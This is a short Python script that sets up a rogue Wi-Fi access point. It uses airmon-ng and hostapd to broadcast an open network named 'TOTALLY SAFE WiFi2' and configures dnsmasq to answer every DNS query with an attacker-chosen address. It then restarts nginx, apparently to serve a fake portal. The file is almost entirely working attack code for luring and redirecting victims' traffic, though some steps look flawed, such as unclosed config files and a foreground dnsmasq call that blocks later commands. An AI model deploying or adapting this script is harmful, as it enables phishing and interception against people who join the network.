#!/usr/bin/python

import os
import sys

def writehostapd():
	f = open("/tmp/hostapd.conf","w")
	f.write("interface=wlan0mon\n")
	f.write("driver=nl80211\n")
	f.write("ssid=\"TOTALLY SAFE WiFi2\"\n")
	f.write("hw_mode=g\n")
	f.write("channel=3\n")
	f.write("macaddr_acl=0\n")
	f.write("ignore_broadcast_ssid=0\n")
	

def writeDnsmasq():
	f = open("/tmp/dnsmasq.conf","w")
	f.write("interface=wlan0mon\n")
	f.write("dhcp-range="+str(sys.argv[3])+","+str(sys.argv[4])+",12h\n")
	f.write("server=8.8.8.8\n")
	f.write("address=\"/#/"+str(sys.argv[2])+"\"\n")
	f.write("dhcp-option=3,"+str(sys.argv[2])+"\n")
	f.write("dhcp-option=6,"+str(sys.argv[2])+"\n")
	f.write("log-queries\n")
	f.write("log-dhcp\n")
	f.write("listen-address=127.0.0.1\n")

os.system('airmon-ng check kill')
os.system('airmon-ng start wlan0')
os.system('rm /tmp/hostapd.conf')
writehostapd()
os.system('hostapd /tmp/hostapd.conf &')
os.system('rm /tmp/dnsmasq.conf')
writeDnsmasq()
os.system('dnsmasq -C /tmp/dnsmasq.conf -d')
os.system('ifconfig wlan0mon up ' + str(sys.argv[2]) + ' netmask 255.255.255.0')
os.system('route add -net ' + str(sys.argv[1]) + ' 255.255.255.0 gw ' + str(sys.argv[1]))
os.system('service nginx reload')
os.system('service nginx restart')
